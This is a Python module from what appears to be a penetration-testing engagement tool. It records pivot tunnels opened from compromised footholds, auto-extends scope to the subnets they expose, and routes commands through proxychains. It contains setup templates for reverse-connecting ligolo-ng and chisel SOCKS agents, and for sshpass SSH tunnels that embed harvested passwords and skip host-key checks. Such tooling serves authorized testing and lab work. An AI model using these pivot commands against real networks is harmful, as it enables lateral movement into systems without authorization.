"""Tunnels layer (§6d) — pivot transports as a registry, live state, and a
route-aware runner.

This is the second half of the recursive-segment-mapper milestone. §6c surfaces a
foothold's reachable adjacent subnets as *candidates*; this module turns a chosen
candidate into a **tunnel**: a live transport (ligolo-ng, chisel, sshuttle, ssh
`-L`/`-D`) built from the foothold, after which the exposed subnet is authorized and
runs against hosts in it are routed correctly.

Three obol contracts this preserves, mirroring the sessions layer (§6a):

- **Tunnels are live state, not facts.** A tunnel carries a status that can flip
  (connecting/up/down/closed); only the *discoveries* it leads to are facts. So a
  tunnel is recorded in ``Workspace.tunnels`` (a SQLite table), never as a Fact.
- **A proven pivot auto-extends scope, never bypasses it.** Bringing a tunnel up
  that exposes subnet X auto-adds X to the operator's scope, tagged with the tunnel
  that authorized it (visibly distinct from operator-typed scope). The runner's hard
  scope gate is unchanged — it is auto-populated from a proven foothold.
- **Transport, not planner branching, decides proxychains.** The registry records
  each transport (transparent L3 vs SOCKS), and the route-aware runner reads it: a
  host reachable only through a SOCKS tunnel gets ``proxychains -q`` auto-prefixed;
  through a transparent route (ligolo/sshuttle) it does not. The operator never
  manages proxychains by hand.

Interactive listeners don't fit the capture-and-parse runner, so — exactly like a
session login — a tunnel's setup command is handed to the operator to launch; obol
records the live tunnel and manages scope/routing around it. The auto-tunnel cascade,
the §6e through-tunnel health sweep, and the §6f topology map build on this slice.
"""
from __future__ import annotations

import ipaddress
from dataclasses import dataclass

from . import board
from .scope import normalize_target
from .workspace import Workspace

# Access facts that mean "there is a foothold here to build a tunnel from".
_FOOTHOLD_FACTS = ("foothold.linux", "foothold.windows", "access.shell",
                   "access.admin", "access.system")


class TunnelError(Exception):
    """A tunnel request that cannot be honored (unknown kind/host, no foothold, or a
    bad exposed subnet)."""


@dataclass(frozen=True)
class TunnelKind:
    key: str
    label: str
    transport: str          # "transparent" (L3 route) | "socks" | "portforward"
    os: tuple[str, ...]     # foothold OS this transport is offered for ("" = any)
    setup_template: str     # the command handed to the operator to bring it up
    note: str = ""
    privilege: str = "user"  # privilege needed on the foothold ("user" | "admin")
    exposes_subnet: bool = True   # False ⇒ a single-port forward, not a subnet route

    @property
    def needs_proxychains(self) -> bool:
        """A SOCKS transport carries only what proxychains wraps; a transparent L3
        route (ligolo/sshuttle) does not, and a single local forward is used directly."""
        return self.transport == "socks"


# The transports covered by this first slice, in rough preference order (the
# auto-tunnel cascade §6d will walk this order; for now the operator picks).
TUNNEL_KINDS: tuple[TunnelKind, ...] = (
    TunnelKind(
        key="ligolo", label="ligolo-ng", transport="transparent", os=(),
        setup_template="ligolo-ng agent -connect {{lhost}}:11601 -ignore-cert",
        note="Transparent L3 route via the ligolo proxy — no proxychains. Start the "
             "proxy on your box and add the exposed subnet route to the ligolo interface.",
        privilege="admin",
    ),
    TunnelKind(
        key="sshuttle", label="sshuttle", transport="transparent", os=("linux",),
        setup_template="sshuttle -r {{user}}@{{target}} {{subnet}} --ssh-cmd 'sshpass -p {{password}} ssh -o StrictHostKeyChecking=no'",
        note="Transparent VPN-over-SSH — no proxychains. Needs SSH creds and python on the target.",
    ),
    TunnelKind(
        key="chisel", label="chisel (SOCKS)", transport="socks", os=(),
        setup_template="chisel client {{lhost}}:8080 R:socks",
        note="Reverse SOCKS proxy. Run 'chisel server -p 8080 --reverse' on your box; "
             "obol prefixes proxychains for hosts reached through it.",
    ),
    TunnelKind(
        key="ssh-dynamic", label="ssh -D (SOCKS)", transport="socks", os=("linux",),
        setup_template="sshpass -p {{password}} ssh -o StrictHostKeyChecking=no -D 1080 -N {{user}}@{{target}}",
        note="Dynamic SSH SOCKS proxy on 1080. obol prefixes proxychains for hosts "
             "reached through it.",
    ),
    TunnelKind(
        key="ssh-local", label="ssh -L (port forward)", transport="portforward", os=("linux",),
        setup_template="sshpass -p {{password}} ssh -o StrictHostKeyChecking=no -L {{local_port}}:{{remote}}:{{remote_port}} -N {{user}}@{{target}}",
        note="Single local port forward — reaches ONE remote host:port, not a whole "
             "subnet. Used directly (no proxychains).",
        exposes_subnet=False,
    ),
)

_BY_KEY = {k.key: k for k in TUNNEL_KINDS}


def get_kind(key: str) -> TunnelKind | None:
    return _BY_KEY.get(key)


def _has_foothold(tf) -> bool:
    return any(tf.has(k) for k in _FOOTHOLD_FACTS)


def _host_os(tf) -> str:
    from .pack import host_os_family
    return host_os_family(tf)


def eligible_tunnels(ws: Workspace, host: str) -> list[dict]:
    """Which tunnel transports to offer for a host. A transport is offered when the
    host has a proven foothold and the transport's OS fits the foothold OS (unknown
    OS stays permissive). Not gated on a credential here — the setup command needs
    one for SSH-based transports, which is surfaced as a not-ready reason."""
    tf = ws.facts_for_target(host)
    if not _has_foothold(tf):
        return []
    os_family = _host_os(tf)
    creds = tf.values("credential.available") or tf.values("credential.plaintext")
    has_pw = any(c.get("password") for c in creds)
    offers: list[dict] = []
    for k in TUNNEL_KINDS:
        if k.os and os_family and os_family not in k.os:
            continue
        needs_pw = "{{password}}" in k.setup_template
        ready = (not needs_pw) or has_pw
        reason = "" if ready else "needs a validated password for the SSH transport"
        offers.append({
            "kind": k.key, "label": k.label, "transport": k.transport,
            "proxychains": k.needs_proxychains, "exposes_subnet": k.exposes_subnet,
            "privilege": k.privilege, "note": k.note, "ready": ready, "reason": reason,
        })
    return offers


def _cred(tf) -> dict:
    for kind in ("credential.available", "credential.plaintext"):
        for value in tf.values(kind):
            if value.get("password"):
                return value
    return {}


def build_setup_command(ws: Workspace, host: str, kind_key: str, *, subnet: str = "",
                        local_port: int = 0, remote: str = "", remote_port: int = 0,
                        lhost: str = "") -> str:
    """Render the operator's tunnel setup command from facts + the chosen parameters.
    Secrets are included — this is the operator's own lab/exam box."""
    kind = get_kind(kind_key)
    if not kind:
        raise TunnelError(f"unknown tunnel kind {kind_key!r}")
    host = normalize_target(host)
    tf = ws.facts_for_target(host)
    cred = _cred(tf)
    ctx = {
        "subnet": subnet, "lhost": lhost or "{{lhost}}",
        "local_port": str(local_port or 1080), "remote": remote or "{{remote}}",
        "remote_port": str(remote_port or 0),
    }
    if cred:
        ctx["user"] = cred.get("user", "")
        ctx["password"] = cred.get("password", "")
    return board.fill_template(kind.setup_template, ws, host, ctx)


def open_tunnel(ws: Workspace, host: str, kind_key: str, *, subnet: str = "",
                local_port: int = 0, remote: str = "", remote_port: int = 0,
                lhost: str = "", status: str = "up", surface: str = "cli") -> dict:
    """Record a live tunnel from a foothold and, when it exposes a subnet, auto-extend
    scope to that subnet (tagged with this tunnel). Returns the tunnel record, the
    setup command to launch, whether reaching hosts through it needs proxychains, and
    any scope entry added.

    A tunnel setup is an interactive listener, so — like a session login — obol hands
    the operator the ready command rather than capturing it; the tunnel is recorded as
    live state (status defaults to ``up``; a health probe/sweep, §6e, confirms it).
    """
    kind = get_kind(kind_key)
    if not kind:
        raise TunnelError(f"unknown tunnel kind {kind_key!r}")
    host = normalize_target(host)
    if not ws.get_target(host):
        raise TunnelError(f"unknown target {host!r} in this engagement")
    tf = ws.facts_for_target(host)
    if not _has_foothold(tf):
        raise TunnelError(f"no proven foothold on {host!r} — a tunnel is built from a shell")

    exposed = ""
    if kind.exposes_subnet:
        if not subnet:
            raise TunnelError(f"{kind.label} exposes a subnet — pass the subnet it reaches")
        try:
            exposed = str(ipaddress.ip_network(subnet, strict=False))
        except ValueError as exc:
            raise TunnelError(f"invalid exposed subnet {subnet!r}: {exc}") from exc

    setup_cmd = build_setup_command(ws, host, kind_key, subnet=exposed, local_port=local_port,
                                    remote=remote, remote_port=remote_port, lhost=lhost)

    scope_added = ""
    if exposed and exposed not in ws.scope:
        # auto-extend the hard scope gate from a proven foothold (never a bypass).
        ws.add_scope(exposed)
        scope_added = exposed

    tunnel = ws.add_tunnel(
        host=host, kind=kind.key, transport=kind.transport, status=status,
        exposed_subnet=exposed, local_port=local_port or (1080 if kind.transport == "socks" else 0),
        setup_command=setup_cmd, proxychains=kind.needs_proxychains, label=kind.label,
    )
    ws.record_run(
        kind.key, setup_cmd, [],
        surface=surface, tunnel=tunnel["id"], target=host, kind="tunnel",
        transport=kind.transport, exposed_subnet=exposed,
    )
    ws.save()
    return {"ok": True, "tunnel": tunnel, "setup_command": setup_cmd,
            "proxychains": kind.needs_proxychains, "scope_added": scope_added}


def close_tunnel(ws: Workspace, tid: str) -> dict:
    if not ws.get_tunnel(tid):
        raise TunnelError(f"no tunnel {tid!r}")
    ws.update_tunnel(tid, status="down")
    ws.save()
    return {"ok": True, "tunnel": ws.get_tunnel(tid)}


def remove_tunnel(ws: Workspace, tid: str) -> dict:
    """Remove a tunnel and retract the scope it auto-added, unless a live target now
    sits inside that subnet (mirroring how a live target's scope can't be pulled)."""
    tunnel = ws.get_tunnel(tid)
    if not tunnel:
        raise TunnelError(f"no tunnel {tid!r}")
    subnet = tunnel.get("exposed_subnet", "")
    ws.remove_tunnel(tid)
    retracted = ""
    if subnet and subnet in ws.scope and not _subnet_still_needed(ws, subnet):
        ws.remove_scope(subnet)
        retracted = subnet
    ws.save()
    return {"ok": True, "removed": tid, "scope_retracted": retracted}


def _subnet_still_needed(ws: Workspace, subnet: str) -> bool:
    """True if a live target sits in the subnet, or another live tunnel still exposes
    it — either way the scope entry stays."""
    try:
        net = ipaddress.ip_network(subnet, strict=False)
    except ValueError:
        return True
    for t in ws.targets:
        try:
            if ipaddress.ip_address(t["host"]) in net:
                return True
        except ValueError:
            continue
    for t in ws.tunnels:
        if t.get("id") and t.get("exposed_subnet") == subnet and t.get("status") in {"up", "connecting"}:
            return True
    return False


def route_prefix(ws: Workspace, target: str) -> str:
    """The command prefix needed to reach ``target`` given the live tunnels:
    ``"proxychains -q "`` when it is reachable only through a SOCKS tunnel, else ``""``.

    A transparent L3 route (ligolo/sshuttle) needs no prefix; proxychains is added
    only for a host that lives behind a SOCKS tunnel's exposed subnet with no
    transparent route to it. A host outside every tunnel subnet (the pivot host and
    directly-reachable hosts) is reached directly, so it gets no prefix.
    """
    host = normalize_target(target)
    try:
        ip = ipaddress.ip_address(host)
    except ValueError:
        return ""   # a hostname — can't map it to a tunnel subnet
    live = [t for t in ws.tunnels if t.get("status") == "up" and t.get("exposed_subnet")]
    socks = False
    for t in live:
        try:
            if ip in ipaddress.ip_network(t["exposed_subnet"], strict=False):
                if t.get("transport") == "transparent":
                    return ""   # a transparent route wins — no proxychains
                if t.get("transport") == "socks":
                    socks = True
        except ValueError:
            continue
    return "proxychains -q " if socks else ""


def tunnel_scope_entries(ws: Workspace) -> dict[str, str]:
    """Map each tunnel-authorized scope entry to the tunnel id that added it, so a
    surface can mark pivot-authorized scope as visibly distinct from operator scope."""
    out: dict[str, str] = {}
    for t in ws.tunnels:
        subnet = t.get("exposed_subnet", "")
        if subnet and subnet in ws.scope:
            out[subnet] = t.get("id", "")
    return out


__all__ = [
    "TunnelError", "TunnelKind", "TUNNEL_KINDS", "get_kind", "eligible_tunnels",
    "build_setup_command", "open_tunnel", "close_tunnel", "remove_tunnel",
    "route_prefix", "tunnel_scope_entries",
]
